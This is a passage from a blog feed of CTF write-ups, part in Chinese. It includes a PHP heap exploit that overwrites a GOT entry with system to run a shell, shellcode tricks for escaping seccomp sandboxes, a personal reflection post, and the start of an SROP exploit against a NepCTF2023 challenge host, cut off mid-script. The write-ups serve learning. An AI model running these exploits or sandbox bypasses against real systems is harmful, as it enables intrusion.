address</span><br></pre></td></tr></table></figure><p><code>leakfind</code> is a powerful tool to leak address given a starting address, then we can find some libc pointers on the heap.</p><p><img src="/../img/php-pwn.assets/image-20230915151632552.png" alt="image-20230915151632552"></p><p>On obtaining the libc address, we get heaphp.so address since they have constant offset, then we can overwrite the <code>_efree@got.plt</code> on the heaphp.so with the actual address of <code>system</code>  on libc.so.</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>It`s not the final edition because functions like <code>chr()</code> are banned in the docker, and getting shell is usually not allowed in PHP pwn. I preserved them to make it more readable.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function mychr($index)&#123;</span></span><br><span class="line"><span class="comment">// return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¡&#x27;, &#x27;¢&#x27;, &#x27;£&#x27;, &#x27;¤&#x27;, &#x27;¥&#x27;, &#x27;¦&#x27;, &#x27;§&#x27;, &#x27;¨&#x27;, &#x27;©&#x27;, &#x27;ª&#x27;, &#x27;«&#x27;, &#x27;¬&#x27;, &#x27;\xad&#x27;, &#x27;®&#x27;, &#x27;¯&#x27;, &#x27;°&#x27;, &#x27;±&#x27;, &#x27;²&#x27;, &#x27;³&#x27;, &#x27;´&#x27;, &#x27;µ&#x27;, &#x27;¶&#x27;, &#x27;·&#x27;, &#x27;¸&#x27;, &#x27;¹&#x27;, &#x27;º&#x27;, &#x27;»&#x27;, &#x27;¼&#x27;, &#x27;½&#x27;, &#x27;¾&#x27;, &#x27;¿&#x27;, &#x27;À&#x27;, &#x27;Á&#x27;, &#x27;Â&#x27;, &#x27;Ã&#x27;, &#x27;Ä&#x27;, &#x27;Å&#x27;, &#x27;Æ&#x27;, &#x27;Ç&#x27;, &#x27;È&#x27;, &#x27;É&#x27;, &#x27;Ê&#x27;, &#x27;Ë&#x27;, &#x27;Ì&#x27;, &#x27;Í&#x27;, &#x27;Î&#x27;, &#x27;Ï&#x27;, &#x27;Ð&#x27;, &#x27;Ñ&#x27;, &#x27;Ò&#x27;, &#x27;Ó&#x27;, &#x27;Ô&#x27;, &#x27;Õ&#x27;, &#x27;Ö&#x27;, &#x27;×&#x27;, &#x27;Ø&#x27;, &#x27;Ù&#x27;, &#x27;Ú&#x27;, &#x27;Û&#x27;, &#x27;Ü&#x27;, &#x27;Ý&#x27;, &#x27;Þ&#x27;, &#x27;ß&#x27;, &#x27;à&#x27;, &#x27;á&#x27;, &#x27;â&#x27;, &#x27;ã&#x27;, &#x27;ä&#x27;, &#x27;å&#x27;, &#x27;æ&#x27;, &#x27;ç&#x27;, &#x27;è&#x27;, &#x27;é&#x27;, &#x27;ê&#x27;, &#x27;ë&#x27;, &#x27;ì&#x27;, &#x27;í&#x27;, &#x27;î&#x27;, &#x27;ï&#x27;, &#x27;ð&#x27;, &#x27;ñ&#x27;, &#x27;ò&#x27;, &#x27;ó&#x27;, &#x27;ô&#x27;, &#x27;õ&#x27;, &#x27;ö&#x27;, &#x27;÷&#x27;, &#x27;ø&#x27;, &#x27;ù&#x27;, &#x27;ú&#x27;, &#x27;û&#x27;, &#x27;ü&#x27;, &#x27;ý&#x27;, &#x27;þ&#x27;, &#x27;ÿ&#x27;][$index];</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line"><span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line"><span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line"><span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line"><span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line"><span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tricks of Shellcode</title>
      <link href="/Tricks-of-Shellcode/"/>
      <url>/Tricks-of-Shellcode/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近打了挺多比赛，碰到一些比较有意思的题和方法</p></blockquote><p>shellcode的题挺多，往往都是加了一些乱七八糟的限制。一般要么限制字符，要么开沙箱。限制字符基本上就通过手搓<del>我不会</del>或者alpha3之类的工具实现，这里讲一些绕过沙箱的办法。</p><h1 id="切换架构"><a href="#切换架构" class="headerlink" title="切换架构"></a>切换架构</h1><p>题目不仅禁止getshell，甚至限制了orw，如果沙箱没有对系统架构进行检查，就可以使用切换架构的方式。</p><p>原理是沙箱通过检测系统调用号判断是否放行，而64位和32位架构下的系统调用号又不相同，切换到另一种架构，就能实现绕过黑名单检查</p><p>这种手法听起来很炫酷，操作却相当简单</p><p>程序运行时的架构，是由<code>cs</code>寄存器控制的。<code>cs=0x23</code>为32位模式，<code>cs=0x33</code>为64位模式。而<code>retfq</code>指令就能实现对<code>cs</code>的赋值</p><p><code>retfq</code>包含<code>ret</code>和<code>pop cs</code>两步，也就是先后pop <code>rip</code>和<code>cs</code>，所以一般可以像这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, 0x40404040 #arbitrary stack</span><br><span class="line">push 0x23 #or 0x33</span><br><span class="line">push 0x401145 #next shellcode</span><br><span class="line">retfq</span><br></pre></td></tr></table></figure><p>注意这里需要设置<code>rsp</code>，这是因为切换到32位时，寄存器也会被切成32位，所以需要预先调整栈顶的指针</p><p>另外我在操作时发现<code>ret</code>后的地址似乎有一定要求。起初我直接跳到下一条shellcode上，但会在retfq时崩溃，后来我<code>ret</code>到代码段里调用shellcode的地址，再提前设置好寄存器，顺利解决了这个问题</p><h1 id="者行孙"><a href="#者行孙" class="headerlink" title="者行孙"></a>者行孙</h1><p><del>你就说是不是一个东西吧</del></p><p>没有open的可以用openat代替</p><p>没有read的可以用pread64&#x2F;writev代替</p><p><a href="https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall/src/filesystem/read-pread64-readv-preadv-preadv2.html">read, pread64, readv, preadv, preadv2系统调用</a></p><p>这么玩就没意思了</p><h1 id="使用socket"><a href="#使用socket" class="headerlink" title="使用socket"></a>使用socket</h1><p>有空看看</p><p><a href="http://blog.eonew.cn/2019-06-03.%E5%8F%8D%E5%90%91shellcode.html">EX大佬的博客</a></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>挺有趣的做法，找时间再详细研究下</p><p><a href="https://m1ku.in/archives/737">m1ku大佬的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>摸</title>
      <link href="/%E6%91%B8/"/>
      <url>/%E6%91%B8/</url>
      
        <content type="html"><![CDATA[<p>在电专摸了一年，不知不觉已经成了老油条的形状</p><p>大一整体处于一个比较迷茫的状态。开学时，机缘巧合下碰见了凝聚的招新赛，靠着热情冲了一个月，以pwn手的身份进入，随后就开始<strong>长达一个半学期</strong>的摸鱼期。期间或是卷分数（集电学院的风气懂的都懂），或是搞一些乱七八糟的比赛（也没有什么成绩），更多的时候，记忆缺失，大抵是在摸鱼罢</p><p>后来大一下，去了趟ASC的观摩，认识了一些凝聚的学长和Beetoven，还认识了南昌大学的cs佬。突然觉得，搞这些也挺有意思。此后开始参与更多凝聚的活动（并捡起所剩不多的pwn知识</p><p>接着就是国赛初赛，人生第二次来到工作室，社恐得宛如一个新生。好在初赛有些简单题，挺适合我这种招新赛水平选手康复。最后还是顺利进了复赛</p><p>复赛的时候连堆都不会，纯fw，挺可惜，还是和Casio3组的队。事后痛定思痛，决定以后不摸了</p><p>此时的我怎么也想不到，一个月之后，我会在讲台上给人讲高版本堆利用（</p><p>培训前还有个小插曲，<del>因为军训的某种神必力量</del>，鄙人全身起疹子在医院躺了一周</p><p>暑假期间打了一些比赛，<del>感觉我怎么什么都不会</del>感觉我的二进制之旅才刚刚开始</p><hr><p>摸过来的这一年，成绩不上不下，好在没有掉出保研线。二进制依旧是一个新人的水平，想到马上又要迎接下一届新人，不禁感到汗颜。</p><p>最近和学长们聊天比较多，对自己的未来逐渐也有了一些规划。目前主要精力还是会放在二进制上，并开始涉足密码学</p><p>毕竟是新学期，还是立几个flag吧（什么？哪里有flag？我直接cat）</p><ul><li><input disabled="" type="checkbox"> 养成写博客输出知识的习惯，尝试英文写作</li><li><input disabled="" type="checkbox"> 多参加ctf，丰富经历</li><li><input disabled="" type="checkbox"> 学习内核漏洞利用</li><li><input disabled="" type="checkbox"> 不熬夜，多锻炼</li></ul>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SROP初见杀-NepCTF2023</title>
      <link href="/SROP/"/>
      <url>/SROP/</url>
      
        <content type="html"><![CDATA[<p>这次比赛第一题就是很明显的<strong>SROP</strong>，正好啥也不会，学习了一下</p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p><strong>SROP</strong>全称为<strong>Sigreturn Oriented Programming</strong>，其攻击核心为通过伪造一个<strong>Signal Frame</strong>（以下简称<strong>sigFrame</strong>）在栈上，同时触发<strong>sigreturn</strong>系统调用，让内核为我们恢复一个sigFrame所描述的进程，如一个shell、一个wrtie系统调用打印栈地址等，同时通过对sigFrame中rsp和rip的修改，连接多个sigFrame，可通过多次触发sigreturn系统调用，依次恢复多个sigFrame，实现不同的功能，构成SROP攻击。一个sigFrame可理解为一个进程被挂起时，用于保存进程的数据结构，当进程恢复时，通过触发sigreturn来恢复sigFrame，从而恢复一个进程。</p><p>以上内容是抄的，说白了就是：进程受到一个signal进入中断，内核会保存上下文（寄存器状态之类的，这个上下文存在<strong>sigFrame</strong>中），随后进入用户态执行处理函数，处理完最后又进入内核态恢复上下文</p><p><img src="/../img/SROP.assets/image-20230812205434238.png" alt="image-20230812205434238"></p><p>而这个保存上下文的sigFrame完全在<strong>用户空间</strong>，并且内核对进程挂起时保存的sigFrame以及恢复时还原的sigFrame<strong>没有做任何关联</strong>，这导致sigFrame可以被伪造</p><p><img src="/../img/SROP.assets/image-20230812205639153.png" alt="image-20230812205639153"></p><p>上图是64位的sigFrame结构。恢复上下文之前，会调用处理函数<strong>Signal Handler</strong>，该函数最后一个指令是<code>ret</code>，此时<code>rsp</code>正好指向sigFrame的栈顶，也就是存有函数<code>rt_sigreturn</code>地址的位置。随后调用<code>rt_sigreturn</code>，通过该函数完成上下文的恢复。</p><p>因此，我们可以在<code>rsp</code>附近伪造sigFrame，通过调用<code>rt_sigreturn</code>完成寄存器的布置</p><p>调用可以直接写内存，更常见的是进行调用号为0xf的系统调用</p><blockquote><p>小技巧：系统调用号可以通过<code>cat /usr/include/asm/unistd_64.h</code>查看</p></blockquote><p>另外，pwntools中的<code>SigreturnFrame()</code>可以方便完成寄存器的布置</p><h1 id="Nepctf2023-SROP"><a href="#Nepctf2023-SROP" class="headerlink" title="Nepctf2023-SROP"></a>Nepctf2023-SROP</h1><p>源码都喂我嘴里了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x30</span>]=<span class="string">&quot;welcome to NepCTF2023!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="type">char</span> bd[<span class="number">0x30</span>];</span><br><span class="line">     seccomp();</span><br><span class="line">     syscall(<span class="number">1</span>,<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">     <span class="keyword">return</span> syscall(<span class="number">0</span>,<span class="number">0</span>,bd,<span class="number">0x300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然需要打一个orw</p><p>注意这里有一个坑，众所周知，<code>syscall</code>的系统调用号是通过<code>rax</code>传递，然而我们反汇编之后</p><p><img src="/../img/SROP.assets/image-20230812211245122.png" alt="image-20230812211245122"></p><p>令人意外的是，这里的<code>syscall</code>都是通过<code>rdi</code>传调用号的，猜测与这里使用<code>call syscall</code>而非直接使用<code>syscall</code>有关</p><p>既然不用<code>rax</code>传调用号，那题目中的<code>sys()</code>函数也就没有意义了，好在能找到<code>pop rdi</code>的gadgets，可以任意布置</p><p>我的思路是，先打一次srop，把flag写到bss段，顺便把栈迁移过去，随后挨着打orw</p><p><strong>伪造sigFreame</strong>时需要<strong>格外注意</strong></p><p><code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code>需要<strong>保持不变</strong>！否则会报错！</p><p>本人就在这里排查了很久</p><p>可以按照如下写法</p><p><code>sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)</code></p><p>从左往右依次为<code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *0x0000000004007AE\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;nepctf.1cepeak.cn&quot;</span></span><br><span class="line">port = <span class="number">30551</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line">sig = <span class="number">0x0000000000400750</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x00000000004007A8</span></span><br><span class="line">buf = <span class="number">0x0000000000601020</span></span><br><span class="line"></span><br><span 